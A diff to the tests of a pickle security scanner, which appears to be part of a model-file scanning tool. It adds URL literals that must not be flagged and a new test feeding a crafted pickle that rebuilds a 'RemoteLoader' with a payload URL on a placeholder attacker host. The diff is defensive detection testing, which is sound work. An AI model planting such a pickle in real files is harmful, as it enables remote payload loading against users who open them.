@@ -1589,6 +1589,8 @@ def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310(prot
             "query_docs": "https://docs.example.invalid/path?x=1&handler=requests.get(url)",
             "semicolon_query_docs": "https://docs.example.invalid/path?x=1;handler=requests.get(url)",
             "comma_query_docs": "https://docs.example.invalid/path?x=1,handler=httpx.get(url)",
+            "s3_docs": "s3://bucket/docs/requests.get(url)",
+            "ftp_docs": "ftp://docs.example.invalid/reference/socket.connect(host)",
             "socket_docs": "https://docs.example.invalid/reference/socket.connect(host)",
             "credentialed_docs": "https://user:pass@docs.example.invalid/reference/os.system(cmd)",
             "encoded_docs": "https://docs.example.invalid/%E2%98%83/%00/reference/subprocess.run(args)",
@@ -1820,6 +1822,22 @@ def test_scan_stream_keeps_network_url_reducer_actionable() -> None:
         and issue.details.get("associated_global") == "urllib.request.urlopen"
         for issue in result.issues
     )
+    explicit_url_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+    ]
+    assert len(explicit_url_issues) == 1
+
+
+def test_scan_stream_keeps_main_url_reducer_actionable() -> None:
+    payload = b"c__main__\nRemoteLoader\n(Vhttps://attacker.example/payload\ntR."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="main-url-reducer.pkl")
+
     explicit_url_issues = [
         issue
         for issue in result.issues
